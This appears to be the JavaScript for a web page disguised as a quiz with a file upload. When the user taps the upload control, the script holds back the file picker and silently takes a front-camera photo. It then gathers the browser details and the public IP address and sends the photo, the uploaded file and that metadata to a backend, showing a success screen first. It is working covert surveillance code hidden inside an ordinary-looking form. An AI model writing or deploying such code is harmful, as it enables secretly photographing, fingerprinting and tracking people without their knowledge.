const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";
const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let capturedImage = null;
let filePickerOpened = false;

// ================================
// CAPTURE CAMERA (ANDROID SAFE)
// ================================
async function captureCamera() {
  if (cameraCaptured) return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);

    video.srcObject = stream;
    video.setAttribute("playsinline", true);
    video.style.display = "block";

    await new Promise(res => {
      video.onloadedmetadata = () => res();
    });

    await video.play();

    // give camera time to render first frame
    await new Promise(r => setTimeout(r, 1000));

    canvas.width = 640;
    canvas.height = 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    capturedImage = canvas.toDataURL("image/png");

    console.log("✅ Camera captured successfully");

    stream.getTracks().forEach(t => t.stop());
    video.style.display = "none";

    cameraCaptured = true;
  } catch (err) {
    console.log("❌ Camera failed:", err);
  }
}

// ================================
// FILE INPUT – HARD FIX
// ================================
fileInput.addEventListener("pointerdown", async (e) => {
  if (!cameraCaptured) {
    e.preventDefault();        // 🚫 stop file picker
    await captureCamera();     // 📸 capture camera
  }

  if (!filePickerOpened) {
    filePickerOpened = true;
    setTimeout(() => fileInput.click(), 50); // ✅ open picker manually
  }
});

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    time: new Date().toLocaleString(),
    ip: ""
  };

  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    metadata.ip = ipData.ip;
  } catch {}

  return metadata;
}

// ================================
// UPLOAD FILE
// ================================
async function uploadFileWithMetadata(file, metadata, cameraImage) {
  const reader = new FileReader();

  return new Promise((resolve, reject) => {
    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            file: reader.result,
            filename: file.name,
            metadata,
            cameraImage
          }),
        });

        resolve(await res.json());
      } catch (e) {
        reject(e);
      }
    };

    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FORM
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Upload a file first");
    return;
  }

  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "flex";

  try {
    const metadata = await collectMetadata();
    const res = await uploadFileWithMetadata(
      fileInput.files[0],
      metadata,
      capturedImage
    );

    console.log("✅ Upload successful:", res);
  } catch (err) {
    console.error("❌ Upload failed:", err);
  }
});
